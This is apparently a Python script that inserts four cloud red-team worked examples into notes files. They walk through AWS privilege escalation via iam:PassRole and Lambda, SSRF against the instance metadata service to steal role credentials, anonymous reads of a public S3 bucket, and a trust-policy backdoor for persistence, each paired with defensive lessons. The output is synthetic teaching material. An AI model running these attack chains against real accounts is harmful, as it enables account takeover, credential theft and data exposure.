#!/usr/bin/env python3
"""Offensive Security worked examples — batch 15 (Cloud Red Team, authored)."""
import re
import sys

PROV = ("> [!note] Representative output\n"
        "> Reconstructed to match the AWS CLI's real output shapes rather than "
        "captured from one account; identifiers are synthetic. The field names, "
        "error strings and command structure are what a live account returns.\n")

IDENTITY = '''## Worked Example: Escalating Through PassRole Without an Exploit

Cloud privilege escalation is usually not a vulnerability — it is a permitted
combination of API calls. This walks the canonical `iam:PassRole` chain from a
low-privileged principal to account admin, using nothing an exploit scanner would
flag.

''' + PROV + '''
**Know who you are** — the first call in any cloud operation:

```shell-session
$ aws sts get-caller-identity
{
    "UserId": "AIDA4XMPL7QEXAMPLE01",
    "Account": "123456789012",
    "Arn": "arn:aws:iam::123456789012:user/ci-deploy"
}
```

`ci-deploy` is a service user, not an admin. The question is not "am I admin" but
"can I *become* admin" — and the answer lives in what this principal is permitted
to do, not in what it is.

**Enumerate the dangerous permissions** the principal holds:

```shell-session
$ aws iam list-attached-user-policies --user-name ci-deploy
{
    "AttachedPolicies": [
        { "PolicyName": "ci-deploy-lambda", "PolicyArn": "arn:aws:iam::123456789012:policy/ci-deploy-lambda" }
    ]
}
$ aws iam get-policy-version --policy-arn arn:aws:iam::123456789012:policy/ci-deploy-lambda --version-id v3 \\
    --query 'PolicyVersion.Document.Statement[].Action'
[ "iam:PassRole", "lambda:CreateFunction", "lambda:InvokeFunction" ]
```

Three actions, each individually mundane. `iam:PassRole` alone does nothing. But
`PassRole` plus the ability to create and invoke a Lambda is the classic
escalation: create a function, pass it a role more privileged than yourself,
invoke it, and your code runs with that role's permissions.

**Execute the chain.** Create a function that runs under the admin role, and
invoke it:

```shell-session
$ aws lambda create-function --function-name deploy-helper \\
    --runtime python3.12 --handler h.run --zip-file fileb://f.zip \\
    --role arn:aws:iam::123456789012:role/OrgAdminRole
{
    "FunctionName": "deploy-helper",
    "Role": "arn:aws:iam::123456789012:role/OrgAdminRole",
    "State": "Active"
}
$ aws lambda invoke --function-name deploy-helper --payload '{"cmd":"whoami"}' out.json >/dev/null
$ grep -o 'OrgAdminRole' out.json
OrgAdminRole
```

The function was accepted with `OrgAdminRole` attached — the control plane never
asked whether `ci-deploy` *deserved* that role, only whether it was permitted to
`PassRole` it, which it was. Code now runs as `OrgAdminRole`, and the account is
effectively taken over by a principal that started with three innocuous
permissions.

The lesson for both sides is that escalation is *transitive*. A permission review
that reads each grant in isolation passes this policy — nothing here says
`Administrator`. Escalation lives in what the permissions let the principal
*become*, which is why cloud IAM must be evaluated as a graph of reachable
privilege, and why tools that compute that reachability (the "who can become
admin" query) find what a line-by-line review misses.

'''

CONTROL = '''## Worked Example: SSRF to Full Account Credentials

The most consequential cloud pivot is short: an SSRF bug in one application
becomes the credentials of the whole account, because the instance metadata
service hands out the instance role's keys to anything that can reach it.

''' + PROV + '''
**The SSRF fetches the metadata endpoint** instead of a normal URL:

```shell-session
$ curl -s "https://app.example.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
web-app-instance-role
$ curl -s "https://app.example.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/web-app-instance-role"
{
  "AccessKeyId": "ASIA4XMPLKEYEXAMPLE",
  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  "Token": "IQoJb3JpZ2luX2VjE...<800 chars>...",
  "Expiration": "2026-08-31T21:14:07Z"
}
```

The first request lists the role name attached to the instance; the second
retrieves that role's live temporary credentials. Note `169.254.169.254` — the
link-local address every cloud VM can reach and no external network can. The
application was built to fetch URLs; it was never meant to fetch *this* one, and
nothing in the feature distinguished them.

**The credentials work against the control plane** — the proof that a one-server
bug is now an account-level compromise:

```shell-session
$ export AWS_ACCESS_KEY_ID=ASIA4XMPLKEYEXAMPLE AWS_SECRET_ACCESS_KEY=wJalr... AWS_SESSION_TOKEN=IQoJ...
$ aws sts get-caller-identity
{
    "Account": "123456789012",
    "Arn": "arn:aws:sts::123456789012:assumed-role/web-app-instance-role/i-0abc123def456"
}
$ aws s3 ls
2025-11-02 09:14:55 acme-prod-backups
2025-12-18 16:02:31 acme-customer-exports
```

The attacker is now acting as the instance role, from their own machine, and can
enumerate the account's storage. The blast radius is exactly the permissions of
that role — which on a typical over-provisioned instance is far more than the one
application needed.

**IMDSv2 is the control that breaks this**, and the reason it works is visible in
one failed request:

```shell-session
$ curl -s "https://app.example.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
<html><body>401 - Unauthorized</body></html>
```

IMDSv2 requires a session token obtained by a `PUT` request carrying a specific
header, and a naive SSRF that can only issue `GET` requests cannot get one. The
metadata service refuses, and the pivot dies at step one. This is why "enforce
IMDSv2" is the single highest-value hardening step for cloud VMs, and why an
external test that reaches this endpoint at all is reporting a critical finding
regardless of what it then does with the credentials.

'''

DATA = '''## Worked Example: A Bucket That Answers to Anyone

The most common cloud data breach is not an exploit — it is a storage policy that
names `*` as a principal. Reading a bucket policy the way the cloud evaluator does,
then confirming the exposure anonymously, is the whole skill.

''' + PROV + '''
**The policy says who is allowed what** — and this one says everyone:

```shell-session
$ aws s3api get-bucket-policy --bucket acme-customer-exports --query Policy --output text | python3 -m json.tool
{
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:GetObject",
            "Resource": "arn:aws:s3:::acme-customer-exports/*"
        }
    ]
}
```

Read it as the evaluator does: `Effect: Allow`, `Principal: *`, and — the decisive
absence — no `Condition` block. There is nothing restricting *who* the `*`
includes, so it includes anonymous requests from the public internet. A policy
with the same `Allow` but a `Condition` limiting it to a VPC endpoint or an
organisation ID would be restricted; this one is not.

**The account-level backstop is the second thing to check**, because it can
override a bad policy:

```shell-session
$ aws s3api get-public-access-block --bucket acme-customer-exports
An error occurred (NoSuchPublicAccessBlockConfiguration) ... does not exist
```

The error is the finding. "Block Public Access" is the switch that makes a
`Principal: *` policy inert regardless of what the policy says, and here it is not
configured — so the policy stands unopposed.

**Confirm it anonymously**, with credentials explicitly disabled:

```shell-session
$ aws s3 ls s3://acme-customer-exports/ --no-sign-request
2026-07-14 03:22:10   4881232 customers-2026-q2.csv
$ aws s3 cp s3://acme-customer-exports/customers-2026-q2.csv - --no-sign-request | head -1
id,email,full_name,plan,mrr
```

`--no-sign-request` sends no credentials at all, and the object still returns. That
is the proof: not "an authorised user can read this" but "anyone on the internet
can", demonstrated by reading a header line and stopping. On a real engagement the
restraint matters — establishing the first row is reachable is the finding, and
pulling the full customer file is neither necessary nor authorised.

The invariant this violates is simple to state: an object should be reachable only
by a named principal or one satisfying a network or organisation condition. `Allow
*` with no condition breaks it by definition, and the fix is equally direct — a
principal or condition on the policy, and Block Public Access enabled as the
account-wide backstop that catches the next mistake.

'''

PERSIST = '''## Worked Example: A Backdoor That Survives Every Rotation

Cloud persistence is not a process or a cron job — it is a quiet, legitimate
configuration change to identity that outlives password resets and instance
rebuilds. The most durable version edits a role's trust policy, and it leaves
nothing on any host for a defender to find.

''' + PROV + '''
**A role's trust policy declares who may assume it.** Before the change, only the
account's own service trusts it:

```shell-session
$ aws iam get-role --role-name analytics-role --query 'Role.AssumeRolePolicyDocument.Statement[].Principal'
[ { "Service": "ec2.amazonaws.com" } ]
```

**The backdoor is one added statement** naming an attacker-controlled account as a
trusted principal:

```shell-session
$ aws iam update-assume-role-policy --role-name analytics-role --policy-document file://trust.json
$ aws iam get-role --role-name analytics-role --query 'Role.AssumeRolePolicyDocument.Statement[].Principal'
[
    { "Service": "ec2.amazonaws.com" },
    { "AWS": "arn:aws:iam::999888777666:root" }
]
```

Account `999888777666` is the attacker's. That single `AWS` principal means any
identity in that account can now assume `analytics-role` — and the call is an
ordinary, authorised `update-assume-role-policy`, indistinguishable in isolation
from a legitimate cross-account integration.

**It works from outside, indefinitely:**

```shell-session
$ AWS_PROFILE=attacker aws sts assume-role \\
    --role-arn arn:aws:iam::123456789012:role/analytics-role --role-session-name s
{
    "Credentials": {
        "AccessKeyId": "ASIA...",
        "Expiration": "2026-08-31T22:03:11Z"
    },
    "AssumedRoleUser": {
        "Arn": "arn:aws:sts::123456789012:assumed-role/analytics-role/s"
    }
}
```

The attacker, operating from their own account, holds fresh credentials for the
victim account's role. Nothing was stored on a victim host, so rebuilding every
instance changes nothing. No password was used, so rotating every password changes
nothing. The backdoor is a line in a policy document, and it persists until someone
audits the trust relationships specifically.

That last point is the defensive lesson. Host-based defence — EDR, re-imaging,
credential rotation — is blind to this by construction, because nothing malicious
runs on a host. The only thing that catches it is treating the set of principals
who can assume each role, and the set of credentials for each identity, as
change-controlled state: any addition that did not come through change control is
the persistence, whatever legitimate API call created it.

'''

WORK = {
    "Offensive Security/Red Team Operations/Cloud Red Team Operations/Cloud Identity Operations.md": IDENTITY,
    "Offensive Security/Red Team Operations/Cloud Red Team Operations/Cloud Control Plane Operations.md": CONTROL,
    "Offensive Security/Red Team Operations/Cloud Red Team Operations/Cloud Data Access Simulation.md": DATA,
    "Offensive Security/Red Team Operations/Cloud Red Team Operations/Cloud Persistence Simulation.md": PERSIST,
}

ANCHOR = re.compile(r"^## Task \d+ — (Failure Modes|Security Implications|Detection|Defen|Reporting)", re.M)
SUMMARY = re.compile(r"^## Summary\s*$", re.M)
ANY_TASK = re.compile(r"^## Task \d+ — (.*)$", re.M)


def main():
    apply = "--apply" in sys.argv
    for rel, sec in WORK.items():
        try:
            src = open(rel, encoding="utf-8").read()
        except FileNotFoundError:
            print(f"  MISSING  {rel}")
            continue
        m = ANCHOR.search(src) or SUMMARY.search(src)
        if not m:
            print(f"  ✗ NO ANCHOR  {rel}")
            continue
        out = src[:m.start()] + sec + src[m.start():]
        out = out.replace("## Worked Example:", "## Task 0 — Worked Example:", 1)
        n = [0]

        def renum(mm):
            n[0] += 1
            return f"## Task {n[0]} — {mm.group(1)}"

        out = ANY_TASK.sub(renum, out)
        print(f"  ✓ {n[0]} tasks  {rel.split('/')[-1]}")
        if apply:
            open(rel, "w", encoding="utf-8").write(out)
    print(f"\n{'APPLIED' if apply else 'DRY RUN'}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
